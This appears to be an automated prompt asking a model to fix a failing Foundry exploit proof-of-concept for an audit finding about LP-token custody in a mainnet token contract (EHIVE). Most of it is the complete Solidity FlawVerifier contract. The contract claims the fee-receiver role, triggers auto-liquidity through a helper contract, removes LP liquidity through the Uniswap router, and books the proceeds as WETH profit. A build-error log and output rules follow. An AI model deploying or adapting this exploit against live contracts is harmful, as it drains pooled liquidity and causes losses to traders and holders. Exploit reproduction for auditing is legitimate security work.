You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Privileged wallets receive all LP tokens and can withdraw pooled liquidity
- claim: `startTrading()` sends the entire initial LP position to `owner()`, and `_addLiquidity()` sends all fee-funded LP tokens to `_swapFeeReceiver` instead of locking or burning them.
- impact: Whoever controls those LP tokens can remove the pool liquidity at any time and extract the paired ETH/tokens, collapsing market liquidity and imposing direct losses on traders and holders.
- exploit_paths: ["A privileged caller starts trading, receives the initial LP tokens via `addLiquidityETH(..., owner(), ...)`, then removes liquidity from the pair off-contract.", "Later fee-funded auto-liquidity mints additional LP tokens to `_swapFeeReceiver`, who can also withdraw that protocol-funded liquidity."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IEHIVE is IERC20Like {
    function owner() external view returns (address);
    function startTrading() external;
    function updateFeeReceiver(address newWallet) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02Like {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract TransferHelper {
    function poke(address token, address to, uint256 amount) external {
        require(IERC20Like(token).transfer(to, amount), "helper transfer failed");
    }
}

contract FlawVerifier {
    IEHIVE internal constant TARGET = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
    IUniswapV2Router02Like internal constant ROUTER =
        IUniswapV2Router02Like(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IWETHLike internal constant WETH = IWETHLike(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address internal constant TRIGGER_SINK = 0x1111111111111111111111111111111111111111;
    uint256 internal constant BUY_SEED_ETH = 0.001 ether;
    uint256 internal constant TRIGGER_SEED_CAP = 1e18;

    uint256 internal _profitAmount;
    uint256 internal _baselineEth;
    uint256 internal _baselineWeth;
    bool internal _executed;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            _syncProfit();
            return;
        }

        _executed = true;
        _baselineEth = address(this).balance;
        _baselineWeth = WETH.balanceOf(address(this));

        address pair = _locatePair();

        // exploit_paths[0]: if trading has not started yet, the privileged caller starts
        // trading and receives the initial LP at `owner()`. We preserve that order, but
        // only continue to LP removal if this verifier is actually the live privileged
        // recipient on the fork.
        if (pair == address(0)) {
            _attemptStartTrading();
            pair = _locatePair();
        }
        if (pair != address(0) && _isVerifierOwner()) {
            _drainAnyLpHeld(pair);
        }

        // exploit_paths[1]: the same privileged surface later redirects fee-funded LP
        // mints to `_swapFeeReceiver`; after triggering swapBack, the holder of those LP
        // tokens can remove that protocol-funded liquidity as well.
        _attemptFeeReceiverLpPath(pair);

        _syncProfit();
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptFeeReceiverLpPath(address pair) internal {
        if (pair == address(0)) {
            pair = _locatePair();
        }
        if (pair == address(0)) {
            return;
        }

        if (!_claimFeeReceiverRole()) {
            return;
        }

        _drainAnyLpHeld(pair);

        // A minimal public buy is only used when the verifier holds no EHIVE already; it
        // seeds a non-excluded transfer that can trigger `swapBack()` and therefore the
        // vulnerable `_addLiquidity(..., _swapFeeReceiver, ...)` mint path.
        if (TARGET.balanceOf(address(this)) == 0) {
            _buySeedTokens();
        }

        _triggerAutoLiquidity();
        _drainAnyLpHeld(pair);
    }

    function _locatePair() internal view returns (address) {
        return IUniswapV2FactoryLike(ROUTER.factory()).getPair(address(TARGET), address(WETH));
    }

    function _attemptStartTrading() internal {
        (bool ok,) = address(TARGET).call(abi.encodeWithSelector(IEHIVE.startTrading.selector));
        if (!ok) {
            return;
        }
    }

    function _claimFeeReceiverRole() internal returns (bool ok) {
        (ok,) = address(TARGET).call(abi.encodeWithSelector(IEHIVE.updateFeeReceiver.selector, address(this)));
    }

    function _isVerifierOwner() internal view returns (bool) {
        try TARGET.owner() returns (address tokenOwner) {
            return tokenOwner == address(this);
        } catch {
            return false;
        }
    }

    function _buySeedTokens() internal {
        uint256 spend = address(this).balance;
        if (spend == 0) {
            return;
        }
        if (spend > BUY_SEED_ETH) {
            spend = BUY_SEED_ETH;
        }

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(TARGET);

        (bool ok,) = address(ROUTER).call{value: spend}(
            abi.encodeWithSelector(
                IUniswapV2Router02Like.swapExactETHForTokensSupportingFeeOnTransferTokens.selector,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        if (!ok) {
            return;
        }
    }

    function _triggerAutoLiquidity() internal {
        uint256 seedAmount = TARGET.balanceOf(address(this));
        if (seedAmount == 0) {
            return;
        }
        if (seedAmount > TRIGGER_SEED_CAP) {
            seedAmount = TRIGGER_SEED_CAP;
        }

        // The helper preserves the finding's causality when the verifier is also owner():
        // owner is fee-exempt, so the helper performs the public transfer that can trigger
        // `swapBack()` and mint LP to the attacker-controlled `_swapFeeReceiver`.
        TransferHelper helper = new TransferHelper();
        if (!_safeTransfer(address(TARGET), address(helper), seedAmount)) {
            return;
        }

        (bool ok,) = address(helper).call(
            abi.encodeWithSelector(TransferHelper.poke.selector, address(TARGET), TRIGGER_SINK, seedAmount)
        );
        if (!ok) {
            return;
        }
    }

    function _drainAnyLpHeld(address pair) internal {
        uint256 lpBalance = IERC20Like(pair).balanceOf(address(this));
        if (lpBalance == 0) {
            return;
        }

        _safeApprove(pair, address(ROUTER), 0);
        if (!_safeApprove(pair, address(ROUTER), lpBalance)) {
            return;
        }

        (bool ok,) = address(ROUTER).call(
            abi.encodeWithSelector(
                IUniswapV2Router02Like.removeLiquidityETHSupportingFeeOnTransferTokens.selector,
                address(TARGET),
                lpBalance,
                0,
                0,
                address(this),
                block.timestamp
            )
        );
        if (!ok) {
            return;
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _syncProfit() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > _baselineEth) {
            WETH.deposit{value: ethBalance - _baselineEth}();
        }

        uint256 wethBalance = WETH.balanceOf(address(this));
        _profitAmount = wethBalance > _baselineWeth ? wethBalance - _baselineWeth : 0;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
